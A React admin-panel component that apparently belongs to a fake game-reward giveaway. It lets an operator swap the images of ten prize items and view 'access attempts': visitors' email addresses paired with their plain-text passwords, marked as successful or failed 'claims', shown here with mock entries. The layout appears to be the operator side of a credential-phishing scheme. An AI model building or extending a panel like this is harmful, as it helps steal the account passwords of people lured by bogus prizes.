import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Shield, Upload, Users, Settings, LogOut, Eye } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface AccessAttempt {
  id: string;
  email: string;
  passphrase: string;
  itemName: string;
  timestamp: Date;
  status: 'success' | 'failed';
}

const AdminPanel = () => {
  const [accessAttempts, setAccessAttempts] = useState<AccessAttempt[]>([]);
  const [selectedFiles, setSelectedFiles] = useState<{ [key: number]: File | null }>({});
  const { toast } = useToast();

  // Mock data for demonstration
  useEffect(() => {
    const mockAttempts: AccessAttempt[] = [
      {
        id: '1',
        email: 'user@gmail.com',
        passphrase: 'password123',
        itemName: 'Royal Crown',
        timestamp: new Date(),
        status: 'success'
      },
      {
        id: '2',
        email: 'gamer@yahoo.com',
        passphrase: 'mypass',
        itemName: 'Legendary Sword',
        timestamp: new Date(Date.now() - 30000),
        status: 'failed'
      }
    ];
    setAccessAttempts(mockAttempts);
  }, []);

  const handleFileSelect = (itemId: number, file: File | null) => {
    setSelectedFiles(prev => ({
      ...prev,
      [itemId]: file
    }));
  };

  const handleImageUpdate = (itemId: number) => {
    const file = selectedFiles[itemId];
    if (!file) {
      toast({
        variant: "destructive",
        title: "No file selected",
        description: "Please select an image file first.",
      });
      return;
    }

    // Simulate upload
    toast({
      title: "Image Updated",
      description: `Item ${itemId} image has been updated successfully.`,
      className: "border-primary bg-card text-foreground",
    });
  };

  const handleLogout = () => {
    // Implement logout logic
    toast({
      title: "Logged out",
      description: "You have been logged out successfully.",
    });
  };

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-primary">Admin Control Panel</h1>
              <p className="text-sm text-muted-foreground">Manage rewards and monitor access attempts</p>
            </div>
          </div>
          <Button onClick={handleLogout} variant="outline" className="border-destructive text-destructive hover:bg-destructive hover:text-destructive-foreground">
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Image Management */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Upload className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Item Management</h2>
            </div>
            
            <div className="space-y-4">
              {[...Array(10)].map((_, i) => (
                <div key={i} className="flex items-center gap-4 p-4 bg-muted/30 rounded-lg">
                  <div className="flex-1">
                    <Label className="text-sm font-medium">Item {i + 1}</Label>
                    <Input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleFileSelect(i + 1, e.target.files?.[0] || null)}
                      className="mt-1 text-xs"
                    />
                  </div>
                  <Button
                    onClick={() => handleImageUpdate(i + 1)}
                    size="sm"
                    className="btn-royal"
                    disabled={!selectedFiles[i + 1]}
                  >
                    Update
                  </Button>
                </div>
              ))}
            </div>
          </Card>

          {/* Access Monitoring */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Eye className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Access Attempts</h2>
            </div>
            
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {accessAttempts.map((attempt) => (
                <div key={attempt.id} className="p-4 bg-muted/30 rounded-lg">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-medium text-foreground">{attempt.email}</span>
                    <span className={`px-2 py-1 rounded-full text-xs font-semibold ${
                      attempt.status === 'success' 
                        ? 'bg-green-500/20 text-green-400' 
                        : 'bg-red-500/20 text-red-400'
                    }`}>
                      {attempt.status}
                    </span>
                  </div>
                  <div className="text-sm text-muted-foreground space-y-1">
                    <p>Item: {attempt.itemName}</p>
                    <p>Pass: {attempt.passphrase}</p>
                    <p>Time: {attempt.timestamp.toLocaleString()}</p>
                  </div>
                </div>
              ))}
            </div>
          </Card>
        </div>

        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
          <Card className="card-premium text-center">
            <div className="p-6">
              <Users className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{accessAttempts.length}</h3>
              <p className="text-sm text-muted-foreground">Total Attempts</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">
                {accessAttempts.filter(a => a.status === 'success').length}
              </h3>
              <p className="text-sm text-muted-foreground">Successful Claims</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Settings className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">10</h3>
              <p className="text-sm text-muted-foreground">Active Items</p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;